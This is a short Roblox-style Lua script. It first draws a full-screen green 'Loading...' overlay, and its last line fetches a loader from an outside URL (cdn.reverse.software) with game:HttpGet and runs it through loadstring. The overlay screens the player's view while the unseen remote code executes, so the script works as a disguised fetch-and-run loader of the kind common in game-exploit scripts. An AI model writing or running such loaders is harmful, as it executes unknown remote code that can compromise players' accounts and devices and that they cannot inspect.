loadstring([[
local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "LoadingScreen"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
bg.Parent = gui

local label = Instance.new("TextLabel")
label.Size = UDim2.new(0, 300, 0, 50)
label.Position = UDim2.new(0.5, -150, 0.5, -25)
label.BackgroundTransparency = 1
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.Text = "Loading"
label.Parent = bg

spawn(function()
    local dots = ""
    while gui and gui.Parent do
        dots = dots .. "."
        if #dots > 3 then
            dots = ""
        end
        label.Text = "Loading" .. dots
        wait(0.5)
    end
end)
]])()
ID="eb6e7937-55e8-4508-9ec1-d618c54e3256";
loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
